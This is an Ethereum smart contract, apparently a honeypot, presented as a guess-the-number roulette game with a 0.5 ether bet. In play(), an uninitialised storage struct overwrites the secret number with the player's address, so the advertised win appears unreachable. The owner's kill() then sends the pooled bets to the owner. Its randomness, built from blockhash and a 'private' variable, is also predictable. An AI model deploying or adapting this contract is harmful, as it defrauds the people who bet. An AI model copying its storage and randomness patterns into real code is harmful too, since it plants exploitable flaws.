/**
 *Submitted for verification at Etherscan.io on 2022-08-15
*/

pragma solidity ^0.4.23;

// CryptoRoulette (C)
//
// Guess the number secretly stored in the blockchain and win the whole contract balance!
// A new number is randomly chosen after each try.
//
// To play, call the play() method with the guessed number (1-10).  Bet price: 0.5 ether

contract CryptoRouletteC {

    uint256 private secretNumber;
    uint256 public lastPlayed;
    uint256 public betPrice = 0.5 ether;
    address public ownerAddr;

    struct Game {
        address player;
        uint256 number;
    }
    Game[] public gamesPlayed;

    constructor() public {
        ownerAddr = msg.sender;
        shuffle();
    }

    function shuffle() internal {
        // randomly set secretNumber with a value between 1 and 10
        secretNumber = uint8(keccak256(now, blockhash(block.number-1))) % 10 + 1;
    }

    function play(uint256 number) payable public {
        // prevent "revert tx unless I won" trick
        require(msg.sender == tx.origin);

        require(msg.value >= betPrice && number <= 10);

        Game game;
        game.player = msg.sender;
        game.number = number;
        gamesPlayed.push(game);

        if (number == secretNumber) {
            // win!
            msg.sender.transfer(address(this).balance);
        }

        shuffle();
        lastPlayed = now;
    }

    function kill() public {
        if (msg.sender == ownerAddr && now > lastPlayed + 6 hours) {
            selfdestruct(msg.sender);
        }
    }

    function() public payable { }
}